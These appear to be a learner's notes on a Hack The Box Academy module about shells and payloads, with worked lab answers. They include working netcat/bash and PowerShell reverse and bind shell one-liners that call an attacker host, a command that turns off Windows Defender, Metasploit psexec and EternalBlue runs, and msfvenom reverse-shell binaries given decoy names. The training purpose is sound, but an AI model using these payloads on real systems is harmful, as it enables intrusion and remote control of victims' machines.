# Shells & Payloads

## Contents

- [Shell Basics](#shell-basics)
  - [Bind Shells](#bind-shells)
    - [What is it?](#what-is-it)
    - [Creating a TCP session with Netcat](#creating-a-tcp-session-with-netcat)
    - [Establishing a Basic Bind Shell with Netcat](#establishing-a-basic-bind-shell-with-netcat)
    - [Q](#q-ssh-to-the-target-create-a-bind-shell-then-use-netcat-to-connect-to-the-target-using-the-bind-shell-you-set-up-when-you-have-completed-the-exercise-submit-the-contents-of-the-flagtxt-file-located-at-customscripts)
  - [Reverse Shells](#reverse-shells)
    - [What is it?](#what-is-it)
    - [Hands-on With A Simple Reverse Shell in Windows](#hands-on-with-a-simple-reverse-shell-in-windows)
    - [Q](#connect-to-the-target-via-rdp-and-establish-a-reverse-shell-session-with-your-attack-box-then-submit-the-hostname-of-the-target-box)
- [Payloads](#payloads)
  - [Introduction to Payloads](#introduction-to-payloads)
    - [One-liners Examined](#one-liners-examined)
      - [Netcat/Bash Reverse Shell One-liner](#netcatbash-reverse-shell-one-liner)
        - [Remove /tmp/f](#remove-tmpf)
        - [Make A Named Pipe](#make-a-named-pipe)
        - [Output Redirection](#output-redirection)
        - [Set Shell Options](#set-shell-options)
        - [Open a Connection with Netcat](#open-a-connection-with-netcat)
      - [PowerShell One-liner Explained](#powershell-one-liner-explained)
        - [Calling Powershell](#calling-powershell)
        - [Binding a socket](binding-a-socket)
        - [Setting The Command Stream](#setting-the-command-stream)
        - [Empty Byte Stream](#empty-byte-stream)
        - [Stream Parameters](#stream-parameters)
        - [Set The Byte Encoding](#set-the-byte-encoding)
        - [Invoke-Expression](#invoke-expression)
        - [Show Working Directory](#show-working-directory)
        - [Sets Sendbyte](#sets-sendbyte)
        - [Terminate TCP Connection](#terminate-tcp-connection)
    - [Payloads Take Different Shapes and Forms](#payloads-take-different-shapes-and-forms)
  - [Automating Payloads & Delivery with Metasploit](#automating-payloads--delivery-with-metasploit)
    - [Using Metasploit](#using-metasploit)
      - [Start Metasploit](#start-metasploit)
      - [Search in Metasploit](#search-in-metasploit)
      - [Select the options](#select-the-option)
      - [Checking the options](#checking-the-options)
      - [Set the options](#set-the-options)
    - [Q](#q-exploit-the-target-using-what-youve-learned-in-this-section-then-submit-the-name-of-the-file-located-in-htb-students-documents-folder-format-filenameextension)
  - [Crafting Payloads with MSFvenom](#crafting-payloads-with-msfvenom)
    - [Crafting Payloads with MSFvenom](#crafting-payloads-with-msfvenom-1)
    - [Staged vs. Stageless Payloads](#staged-vs-stageless-payloads)
    - [Building A Stageless Payload](#building-a-stageless-payload)
    - [Building a simple Stageless Payload for a Windows system](#building-a-simple-stageless-payload-for-a-windows-system)
- [Windows Shells](#windows-shells)
  - [Infiltrating Windows](#infiltrating-windows)
    - [Prominent Windows Exploits](#prominent-windows-exploits)
    - [Enumerating Windows & Fingerprinting Methods](#enumerating-windows--fingerprinting-methods)
      - [Pinging a machine](#pinging-a-machine)
      - [OS Detection Scan](#os-detection-scan)
      - [Using banner.nse to enumerate ports](#using-bannernse-to-enumerate-ports)
    - [Payload files for Windows](#payload-files-for-windows)
    - [Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution](#tools-tactics-and-procedures-for-payload-generation-transfer-and-execution)
      - [Payload Transfer and Execution](#payload-transfer-and-execution)
    - [Q: Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\](#q-gain-a-shell-on-the-vulnerable-target-then-submit-the-contents-of-the-flagtxt-file-that-can-be-found-in-c)
- [NIX Shells](#nix-shells)
    - [Infiltrating Unix/Linux](#infiltrating-unixlinux) 
    - [Spawning Interactive Shells]()
      - []()
      - []()
      - []()
      - []()
      - []()
      - []()
      - []()
      - []()
      - 

Web Shells
Skills Assessment
Additional Considerations

# Shell Basics

## Bind Shells

### What is it?

Bind shells are us connecting to another machine (**Victim**)

We are the attacker (**Client**) and the server is the one getting exploited (**Victim**)

To use binding shells, we use **Netcat**

We need the **IP adress** and **port number**

<br>

![](https://academy.hackthebox.com/storage/modules/115/bindshell.png)

---

There can be many challenges associated with getting a shell this way. Here are some to consider:

- There would have to be a listener already started on the target.
- If there is no listener started, we would need to find a way to make this happen.
- Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.

### Creating a TCP session with Netcat

This is a simple demonstration of how netcat works

Setting up the server to listen on port 7777 on their IP adress

```console
target@server:~$ nc -lvnp 7777
Listening on 0.0.0.0 7777
```

Our connection to the server

```console
client@attacker:~$ nc -nv 10.129.201.134 7777
Ncat: Connected to 10.129.201.134:7777.
```

You should have something looking like this

![image](https://user-images.githubusercontent.com/83395536/223362004-968ebde3-9479-4d22-b316-b2a528214922.png)

How you can now send text from the client to the server in the TCP protocol as seen in the picture. This is only a Netcat TCP session that we have established. The next one is for opening up a shell on the victims computer and passing through commands

### Establishing a Basic Bind Shell with Netcat

Now we want to make a bind shell so we can interact with the OS and file system of the victims computer.

On the server-side, we will need to specify the **directory**, **shell**, **listener**, work with some **pipelines**, and **input & output redirection** to ensure a shell to the system gets served when the client attempts to connect.

---

Victim side

```console
target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

The command above are considered our payload, and we delivered this payload manually with pasting this into the terminal.

<br>

Attacker side

```console
client@attacker:~$ nc -nv 10.129.41.200 7777
```

<br>

After this, you should be connected to the victim, and can pass through commands or exploits!

---

### Q: SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.

To do this, I will first spawn in the instance and log in with shh

```console
ssh htb-student@192.168.l.l
```

Then set up our exploit with this command

```console
target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

And on our normal box (Attacker), we connect to the server with

```console
client@attacker:~$ nc -nv 10.129.41.200 7777
```

And now you should have a binding shell.

To find the flag for the task. Go to the root directory and move into the folder /customscripts with cd and cat the flag file.

## Reverse Shells

### What is it?

Reverse shells are the victim connecting to our machine.

With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.

<br>

![](https://academy.hackthebox.com/storage/modules/115/reverseshell.png)

---

### Hands-on With A Simple Reverse Shell in Windows

We will run some powershell code on a Windows target.

First we need to set up our listening port.

To get this to work you need to know your own IP adress. This can be shown with running a command in the terminal

Linux:

```console
ifconfig
```

Windows:

```console
ipconfig
```

Setting up netcat

```console
client@attacker:~$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

We are using the port 443 because we want to ensure it does not get blocked going outbound through the OS firewall and at the network level. Security teams rarely block out the port 443 beacuse it is so common to use for HTTPS

---

Open up the Windows machine

To disable antivirus

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Powershell code payload

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

This is the output you should get in your attack box

```console
client@attacker:~$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

Here we have received the connection and I am running whoami to check the hostname and username.

### Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box.

First we connect to our Windows machine with the RDP protocol.

Set up netcat to listen on port 443.

Run the powershell command for disabling Microsoft Anti Virus

Run the payload as learned previously

![image](https://user-images.githubusercontent.com/83395536/223561378-f945d08b-8e4a-4bf8-bb92-39f652519890.png)

---

We have now connected to our victim.

To submit the hostname of the target box we need to know the hostname. To find this from the command prompt in Windows we run the command

```console
whoami
```

You should have something looking like this:

![image](https://user-images.githubusercontent.com/83395536/223561506-886d7c2c-f05b-4587-864c-559f220cd38b.png)

Now submit the hostname and voila!

# Payloads

## Introduction to Payloads

### One-Liners Examined

---

#### Netcat/Bash Reverse Shell One-liner

```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f`
```

Lets break this down.

##### Remove /tmp/f

```shell-session
rm -f /tmp/f; `
```

Removes the `/tmp/f` file if it exists, `-f` causes `rm` to ignore nonexistent files. The semi-colon (`;`) is used to execute the command sequentially.

##### Make A Named Pipe

```shell-session
mkfifo /tmp/f;
```

Makes a [FIFO named pipe file](https://man7.org/linux/man-pages/man7/fifo.7.html) at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (`;`) is used to execute the command sequentially.

##### Output Redirection

```shell-session
cat /tmp/f | 
```

Concatenates the FIFO named pipe file /tmp/f, the pipe (`|`) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (`|`).

##### Set Shell Options

```shell-session
/bin/bash -i 2>&1 | 
```

Specifies the command language interpreter using the `-i` option to ensure the shell is interactive. `2>&1` ensures the standard error data stream (`2`) `&` standard input data stream (`1`) are redirected to the command following the pipe (`|`).

##### Open a Connection with Netcat

```shell-session
nc 10.10.14.12 7777 > /tmp/f  
```

Uses Netcat to send a connection to our attack host `10.10.14.12` listening on port `7777`. The output will be redirected (`>`) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed

---

#### PowerShell One-liner Explained

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Lets break this down.

##### Calling Powershell

```powershell
powershell -nop -c 
```

Executes `powershell.exe` with no profile (`nop`) and executes the command/script block (`-c`) contained in the quotes. This particular command is issued inside of command-prompt, which is why PowerShell is at the beginning of the command. It's good to know how to do this if we discover a Remote Code Execution vulnerability that allows us to execute commands directly in `cmd.exe`.

##### Binding a socket

```powershell
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,433);
```

Sets/evaluates the variable `$client` equal to (`=`) the `New-Object` cmdlet, which creates an instance of the `System.Net.Sockets.TCPClient` .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses `(10.10.14.158,443)`. The semi-colon (`;`) ensures the commands & code are executed sequentially.

##### Setting The Command Stream

```powershell
$stream = $client.GetStream();
```

Sets/evaluates the variable `$stream` equal to (`=`) the `$client` variable and the .NET framework method called [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) that facilitates network communications. The semi-colon (`;`) ensures the commands & code are executed sequentially.

##### Empty Byte Stream

```powershell
[byte[]]$bytes = 0..65535|%{0}; 
```

Creates a byte type array (`[]`) called `$bytes` that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.

##### Stream Parameters

```powershell
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```

Starts a `while` loop containing the `$i` variable set equal to (`=`) the .NET framework [Stream.Read](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0) (`$stream.Read`) method. The parameters: buffer (`$bytes`), offset (`0`), and count (`$bytes.Length`) are defined inside the parentheses of the method.

##### Set The Byte Encoding

```powershell
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```

Sets/evaluates the variable `$data` equal to (`=`) an [ASCII](https://en.wikipedia.org/wiki/ASCII) encoding .NET framework class that will be used in conjunction with the `GetString` method to encode the byte stream (`$bytes`) into ASCII. In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text. The semi-colon (`;`) ensures the commands & code are executed sequentially.

##### Invoke-Expression

```powershell
$sendback = (iex $data 2>&1 | Out-String ); 
```

Sets/evaluates the variable `$sendback` equal to (`=`) the Invoke-Expression (`iex`) cmdlet against the `$data` variable, then redirects the standard error (`2>`) `&` standard input (`1`) through a pipe (`|`) to the `Out-String` cmdlet which converts input objects into strings. Because Invoke-Expression is used, everything stored in $data will be run on the local computer. The semi-colon (`;`) ensures the commands & code are executed sequentially.

##### Show Working Directory

```powershell
$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';` 
```

Sets/evaluates the variable `$sendback2` equal to (`=`) the `$sendback` variable plus (`+`) the string PS (`'PS'`) plus `+` path to the working directory (`(pwd).path`) plus (`+`) the string `'> '`. This will result in the shell prompt being PS C:\workingdirectoryofmachine >. The semi-colon (`;`) ensures the commands & code are executed sequentially. Recall that the + operator in programming combines strings when numerical values aren't in use, with the exception of certain languages like C and C++ where a function would be needed.

##### Sets Sendbyte

```powershell
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

Sets/evaluates the variable `$sendbyte` equal to (`=`) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.

##### Terminate TCP Connection

```powershell
$client.Close()"
```

This is the [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) method that will be used when the connection is terminated.

The one-liner we just examined together can also be executed in the form of a PowerShell script (`.ps1`). We can see an example of this by viewing the source code below. This source code is part of the [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) project:

### Payloads Take Different Shapes and Forms

We need to understand the differences in payloads to understand why Windows Anti Virus is blocking the script or command from execution.

Because only then we can know how to bypass restrictions with what changes we need to do to our code/payload.

Not all payloads are one-liners. Some payloads that we are going to use come from an automated attack framework as the Metasploit-framework.

---

## Automating Payloads & Delivery with Metasploit

Metaspoit is an automated attack framework that makes it easier when you are in the process of exploiting vulnerabilites.

It has **pre-built** modules that we can use to exploit vulnerabilities and deliver payloads.

I will use the community edition of Metasploit and using the **pre-built** modules and craft payloads with **MSFVenom**

### Using Metasploit

---

#### Start Metasploit

To start Metasploit in our console we launch the program as root with this command

```shell-session
DanielBoye@htb[/htb]$ sudo msfconsole 
```

####

#### Search in Metasploit

```shell-session
msf6 > search smb
```

To search use `search`, and then the key word.

When searching for modules we need to know that they have different **Names**, **Disclosure Date**, **Rank**, **Check** and **Description**.

#### Select the option

```shell-session
msf6 > use 56
```

To select the option, use `use`. Then provide the number of what module you want to use.

#### Checking the options

```shell-session
msf6 exploit(windows/smb/psexec) > options
```

Check options with `options`.

When you have found a module to use, we often want to check the options we have.

We do this to check what options we need to set before running the module

#### Set the options

```shell-session
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.142.172
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

Here is an example of setting up a SMB module with the command `set`

Key takeaways!

- `RHOST` is the IP adress for the **target**
  
- `LHOST` is the IP adress of **our own** local machine
  

#### Run the Exploit!

```shell-session
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.222:4444 
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000

meterpreter > 
```

Run the exploit with `exploit`.

In this demonstration we obtained a shell with metepreter.

#### Create **interactive shell** to the victims computer

```shell-session
meterpreter > shell
Process 604 created.Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

Create a **interactive shell** in metepreter with `shell`

### Q: Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)

Scan target

```shell-session
nmap -sC -sV -Pn 10.129.201.160
```

Output:

![image](https://user-images.githubusercontent.com/83395536/224510196-a09922c0-71df-4566-bc9d-cfda938f09e7.png)

Here we can see that we have a vulnerable Windows machine with SMB running. Lets exploit it with an SMB module from Metasploit.

```shell-session
sudo msfconsole
```

```shellsession
search smb
```

```shell-session
use 58
```

Now set up the options

```shell-session
options
```

![image](https://user-images.githubusercontent.com/83395536/224510211-30546bce-cfc1-4259-9e47-908eb9856ecd.png)

And run the exploit

```shell-session
exploit
```

![image](https://user-images.githubusercontent.com/83395536/224510223-cec44c45-5fa1-47fd-9655-4a94d2fdb3d7.png)

Now we need to find the name of the file that is in the Documents folder for the user we have logged in as. To do this we need to know how to move around in folders in Windows.

Use `dir` to print out the files in the Documents folder to find the name of the file that is the flag

![image](https://user-images.githubusercontent.com/83395536/224510180-f91967ca-661c-46fd-b47f-4d8dc57e1f05.png)

And here our flag is the file `staffsalaries.txt`.

## Crafting Payloads with MSFvenom

- Automated attacks in Metasploit **needs network access** to a vulnerable machine
  
- MSFvenom can be used to craft a payload and send it via email or other social engineering techniques to get the user to execute the file
  
- MSFvenom can **encrypt and encode** your payload to bypass common anti-virus detection signatures.
  

### Crafting Payloads with MSFvenom

List the available payloads:

```shell-session
msfvenom -l payloads
```

### Staged vs. Stageless Payloads

Staged payloads

- Sending more **components** in our attack
  
- Setting a stage
  
- liunx/x86/shell/reverse_tcp
  
  - First initialize payload with executing on target
    
  - It then calls back to out **attack box** to download the remainder of the exploit
    

Stageless paylaods

- Does not have a stage
  
- Better for evading
  
  - Less traffic passing over the network to execute the payload

###

### Building A Stageless Payload

Build it

```shellsession
DanielBoye@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

Break down the command

Call MSFvenom

```shell-session
msfvenom
```

Create a payload

```shell-session
-p
```

Choosing payload (based on Architechture)

```shell-session
linux/x64/shell_reverse_tcp 
```

Callback address

```shell-session
LHOST=10.10.14.113 LPORT=443 
```

Format of the payload

```shell-session
-f elf 
```

Output the file

```shell-session
> createbackup.elf
```

### Building a simple Stageless Payload for a Windows system

Make it an .exe

```shellsession
DanielBoye@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

# Windows Shells

## Infiltrating Windows

Windows contains a fair share of market share in the computer space. With that huge share, comes some prominent Windows Exploits.

### Prominent Windows Exploits

| **Vulnerability** | **Description** |
| --- | --- |
| `MS08-067` | MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability. |
| `Eternal Blue` | MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host. |
| `PrintNightmare` | A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it [here](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html). |
| `BlueKeep` | CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2. |
| `Sigred` | CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller. |
| `SeriousSam` | CVE 2021-36924 exploits an issue with the way Windows handles permission on the `C:\Windows\system32\config` folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials. |
| `Zerologon` | CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds. |

### Enumerating Windows & Fingerprinting Methods

To hack a target, we need to know it's operating system. One way of knowing that the target is a Windows machine is to look at the **Time To Live** (TTL) counter when utilizing ICMP to determine if the host is up.

A typical responce from a Windows host would be either 32 or 128 (most common).

#### Pinging a machine

```shell-session
DanielBoye@htb[/htb]$ ping 192.168.86.39 

PING 192.168.86.39 (192.168.86.39): 56 data bytes
64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
64 bytes from 192.168.86.39: icmp_seq=1 ttl=128 time=9.164 ms
64 bytes from 192.168.86.39: icmp_seq=2 ttl=128 time=14.223 ms
64 bytes from 192.168.86.39: icmp_seq=3 ttl=128 time=11.265 ms
```

Here we can see that the TTL is `ttl=128`, so our target is most likely to be a Windows host.


#### OS Detection Scan


```shell-session
DanielBoye@htb[/htb]$ sudo nmap -v -O 192.168.86.39

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 17:40 EDT
Initiating ARP Ping Scan at 17:40
Scanning 192.168.86.39 [1 port]
Completed ARP Ping Scan at 17:40, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:40
Completed Parallel DNS resolution of 1 host. at 17:40, 0.02s elapsed
Initiating SYN Stealth Scan at 17:40
Scanning desktop-jba7h4t.lan (192.168.86.39) [1000 ports]
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Completed SYN Stealth Scan at 17:40, 1.54s elapsed (1000 total ports)
Initiating OS detection (try #1) against desktop-jba7h4t.lan (192.168.86.39)
Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.010s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
912/tcp open  apex-mesh
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop
```

Here we use the flag `-v` for outputting the `-O` as verbose. `-O` means we are running an OS Identification scan against our target.

#### Using banner.nse to enumerate ports

```shell-session
DanielBoye@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 18:01 EDT
NSE: Loaded 1 scripts for scanning.
<snip>
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Completed SYN Stealth Scan at 18:01, 1.46s elapsed (1000 total ports)
NSE: Script scanning 192.168.86.39.
Initiating NSE at 18:01
Completed NSE at 18:01, 20.11s elapsed
Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.012s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
| banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se
|_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t
912/tcp open  apex-mesh
| banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto
|_col:SOAP, MKSDisplayProtocol:VNC , ,
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
```

Just another way to try and fingerprint the host to check if it is a Windows machine.

### Payload files for Windows

- DDL
  
  - Dynamic Linking Libary
    
  - Injecting a malicious DDL or hjicaking a vulnerable libary on the host can elevate our priviles to SYSTEM or bypass User Account Controls
    
- Batch
  
  - Text based DOS scripts
    
  - .bat
    
  - Run automated command
    
  - Can use it to
    
    - Open up a port on the host
      
    - Connect back to our attacking box
      
- VBS
  
  - VBScript
    
  - Based on Microsofts Visual Basic
    
  - Enables the loading of **Macros**
    
- MSI
  
  - .MSI
    
  - Windows Installer
    
  - Use it to craft a payload
    
  - Once we have it on the host, we can run `msiexec` to execute our file, which will provide us with further access, such as an elevated reverse shell.
    
- Powershell
  
  - Shell envionment and scripting language
    
  - Gives options with gaining shell and execution on a host
    

### Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution

There are many ways to create payloads but you can use frameworks for that. Here is what HTB Academy says:

| **Resource** | **Description** |
| --- | --- |
| `MSFVenom & Metasploit-Framework` | [Source](https://github.com/rapid7/metasploit-framework) MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. |
| `Payloads All The Things` | [Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Here, you can find many different resources and cheat sheets for payload generation and general methodology. |
| `Mythic C2 Framework` | [Source](https://github.com/its-a-feature/Mythic) The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation. |
| `Nishang` | [Source](https://github.com/samratashok/nishang) Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester. |
| `Darkarmour` | [Source](https://github.com/bats3c/darkarmour) Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts. |

#### Payload Transfer and Execution

Trying to drop a payload on a target

- `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built-in Python that provides us a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.
- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): is a great resource to find quick oneliners to help transfer files across hosts expediently.
- `SMB`: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.
- `Remote execution via MSF`: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.
- `Other Protocols`: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.

### Q: Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\

Attack chain

Enumerate

```shell-session
sudo nmap -v -A 10.129.201.97
```

```shell-session
msfconsole
```

```shell-session
use auxiliary/scanner/smb/smb_ms17_010 
```

```shell-session
set RHOST 10.129.201.97
```

```shell-session
run
```

And we can see that the victim is vulnerable

Now lets use MS17_010

```shell-session
search eternal
```

```shell-session
use 2
```

```shell-session
set RHOST 10.129.201.97
```

```shell-session
set LHOST tun0
```

```shell-session
run
```

boom

Then just move to the C:\ and cat the flag.txt file!

# NIX Shells

## Infiltrating Unix/Linux

Linux is used everywhere, that is why it is important to know how to hack it :)

## Spawning Interactive Shells

# Web Shells
## Introduction to Web Shells
## Laudanum, One Webshell To Rule Them All
## Antak Webshell
## PHP Web Shells

# Skills Assessment
## The Live Engagement

# Additional Considerations
## Detection & Prevention
